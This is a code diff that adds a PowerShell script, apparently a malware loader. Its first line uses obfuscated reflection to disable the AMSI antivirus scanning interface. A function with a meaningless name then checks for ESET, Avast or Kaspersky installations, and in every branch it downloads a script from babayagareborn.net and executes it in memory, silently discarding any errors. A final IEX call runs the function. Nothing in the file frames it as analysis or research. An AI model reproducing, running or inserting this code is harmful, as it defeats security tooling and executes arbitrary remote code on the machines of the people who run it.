@@ -1,0 +1,47 @@
+$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true);
+
+
+Function FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG {
+    if ([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")) {
+        try {
+            $codeContent = Invoke-RestMethod -Uri 'https://babayagareborn.net/blackhole/nod32/cc.txt' -TimeoutSec 60
+            $scriptBlock = [ScriptBlock]::Create($codeContent)
+            $scriptBlock.Invoke()
+        }
+        catch {
+           
+        }
+    }
+    elseif ([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")) {
+        try {
+            $codeContent = Invoke-RestMethod -Uri 'https://babayagareborn.net/blackhole/nod32/cc.txt' -TimeoutSec 60
+            $scriptBlock = [ScriptBlock]::Create($codeContent)
+            $scriptBlock.Invoke()
+        }
+        catch {
+            
+        }
+    }
+    elseif ([System.IO.File]::Exists("C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.19\avpui.exe")) {
+        try {
+            $codeContent = Invoke-RestMethod -Uri 'https://babayagareborn.net/blackhole/nod32/cc.txt' -TimeoutSec 60
+            $scriptBlock = [ScriptBlock]::Create($codeContent)
+            $scriptBlock.Invoke()
+        }
+        catch {
+           
+        }
+    }
+    else {
+        try {
+         
+            IEX (Invoke-WebRequest -Uri 'https://babayagareborn.net/palad/5sec.txt' -UseBasicParsing).Content
+        }
+        catch {
+           
+        }
+    }
+}
+
+# Fonksiyonu ÃƒÂ§alÃ„Â±Ã…Å¸tÃ„Â±r
+IEX FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
